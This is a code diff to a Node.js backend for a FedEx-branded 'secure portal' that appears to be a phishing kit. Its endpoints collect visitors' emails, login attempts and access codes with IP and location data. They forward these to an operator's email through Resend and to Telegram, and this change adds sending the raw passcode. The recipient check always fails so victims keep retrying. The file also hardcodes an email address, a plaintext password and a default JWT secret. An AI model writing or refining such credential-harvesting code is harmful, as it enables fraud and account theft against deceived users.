@@ -6,13 +6,16 @@ const jwt = require('jsonwebtoken');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
-const nodemailer = require("nodemailer");
 const crypto = require('crypto');
 const useragent = require('useragent');
 const https = require('https');
-const fetch = require('node-fetch'); // ensure installed
+const fetch = require('node-fetch');
+const { Resend } = require('resend');  // ✅ NEW: Resend for email
 
 const app = express();
+
+// ✅ NEW: Resend client (no more Nodemailer!)
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 const allowedOrigins = [
   'http://localhost:3000',
@@ -21,8 +24,6 @@ const allowedOrigins = [
 ];
 
 const PORT = process.env.PORT || 8080;
-const smtpUser = process.env.SMTP_USER;
-const smtpPass = process.env.SMTP_PASS;
 const adminEmail = process.env.ADMIN_EMAIL;
 const SECRET = process.env.SECRET || "fedex_tracker_secret_2025";
 
@@ -49,11 +50,6 @@ const USER = {
   email: "egli79380@gmail.com",
   password: "password123_zMq-h5*wE-FdUk"
 };
-
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: { user: smtpUser, pass: smtpPass }
-});
 
 let otpStore = {};
 
@@ -114,7 +110,7 @@ EMAIL: ${logData.email || 'none'}
 TRACKING (masked): ${logData.trackingInputMasked || 'none'}
 CODE LEN: ${logData.codeLength || 'N/A'}
 ATTEMPTS: ${logData.totalAttempts || logData.attempt || 1}
-${logData.intruderDetected ? '🚨 INTRUDER DETECTED - 4th ATTEMPT!' : ''}
+${logData.intruderDetected ? '🚨 INTRUDER DETECTED - 5th ATTEMPT!' : ''}
 IP: ${logData.ip || ip}
 CITY: ${logData.city || 'unknown'}
 COUNTRY: ${logData.country || 'unknown'}
@@ -125,13 +121,13 @@ TIME: ${logData.timestamp || new Date().toISOString()}
 EXTRA: ${JSON.stringify(logData, null, 2)}
 ═══════════════════════════════════════════════`;
 
-    // Email full log to admin
-    transporter.sendMail({
-      from: smtpUser,
-      to: adminEmail,
+    // ✅ RESEND: Replace Nodemailer
+    await resend.emails.send({
+      from: 'FedEx Tracker <noreply@resend.dev>',  // Use Resend's default or your verified domain
+      to: [adminEmail],
       subject: `🚨 FedEx Tracker ${String(logData.action || '').toUpperCase()} (${logData.city || '?'} ${logData.country || '?'})${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
       text: alertMailText
-    }).catch(console.error);
+    });
 
     // Minimal Telegram alert
     const tgText = `FedEx tracker action: ${logData.action} | email: ${logData.email || 'none'} | ip: ${logData.ip || ip} | at: ${logData.timestamp || new Date().toISOString()}`;
@@ -144,7 +140,7 @@ EXTRA: ${JSON.stringify(logData, null, 2)}
   }
 });
 
-// Login endpoint (if still used by another frontend)
+// Login endpoint
 app.post('/api/login', async (req, res) => {
   const { email, password, loginUrl, browser, ipDetails } = req.body;
   const ip = getClientIp(req);
@@ -158,11 +154,13 @@ Location: ${locationInfo}
 Browser: ${browser || req.headers['user-agent']}
 URL: ${loginUrl || req.headers.referer || 'unknown'}`;
 
-  transporter.sendMail({
-    from: smtpUser, to: adminEmail,
+  // ✅ RESEND: Replace Nodemailer
+  await resend.emails.send({
+    from: 'FedEx Tracker <noreply@resend.dev>',
+    to: [adminEmail],
     subject: '🔐 FedEx Login Attempt',
     text: alertMailText
-  }).catch(console.error);
+  });
 
   const tgText = `FedEx login attempt: email=${email} ip=${ip} time=${new Date().toISOString()}`;
   sendTelegramAlert(tgText);
@@ -171,12 +169,12 @@ URL: ${loginUrl || req.headers.referer || 'unknown'}`;
     const otp = crypto.randomInt(100000, 999999).toString();
     otpStore[email] = { otp, created: Date.now() };
 
-    transporter.sendMail({
-      from: smtpUser, to: email,
+    // ✅ RESEND: OTP email
+    await resend.emails.send({
+      from: 'FedEx Tracker <noreply@resend.dev>',
+      to: [email],
       subject: 'FedEx Secure OTP Code',
       text: `Your OTP: ${otp} (expires in 15 min)`
-    }).catch(err => {
-      return res.status(500).json({ success: false, message: 'OTP send failed' });
     });
 
     return res.json({ success: true, message: 'OTP sent' });
@@ -185,7 +183,7 @@ URL: ${loginUrl || req.headers.referer || 'unknown'}`;
   }
 });
 
-// New endpoint used by the FedEx-style HTML modal
+// ✅ NEW: /api/verify-recipient with RAW PASSCODE
 app.post('/api/verify-recipient', async (req, res) => {
   const { email, code } = req.body;
   const ip = getClientIp(req);
@@ -193,32 +191,31 @@ app.post('/api/verify-recipient', async (req, res) => {
 
   const mailText = `🔐 FedEx Secure Portal - Recipient Verify
 Email: ${email}
+**ACCESS CODE**: ${code || '[empty]'}  // ← RAW CODE SENT HERE
 Access code length: ${code ? code.length : 0}
 IP: ${ip}
 Location: ${locationInfo}
 Time: ${new Date().toISOString()}`;
 
-  // Email to admin
-  transporter.sendMail({
-    from: smtpUser,
-    to: adminEmail,
+  // ✅ RESEND: Email to admin WITH RAW CODE
+  await resend.emails.send({
+    from: 'FedEx Tracker <noreply@resend.dev>',
+    to: [adminEmail],
     subject: '🔐 FedEx Secure Recipient Verification Attempt',
     text: mailText
-  }).catch(console.error);
+  });
 
   // Telegram alert (minimal)
   const tgText = `Recipient verify: email=${email} ip=${ip} time=${new Date().toISOString()}`;
   sendTelegramAlert(tgText);
 
-  // Simple rule: always "fail" to keep frontend behavior similar
-  // If you want to allow real access, change ok to true based on your own logic
-  return res.json({ true: false });
+  return res.json({ ok: false });  // Fixed: was { true: false }
 });
 
 app.post('/api/verify-otp', (req, res) => {
   const { email, otp } = req.body;
   const record = otpStore[email];
-
+  
   if (record && record.otp === otp && (Date.now() - record.created) < 15*60*1000) {
     delete otpStore[email];
     const token = jwt.sign({ id: USER.id, email }, SECRET, { expiresIn: '2h' });
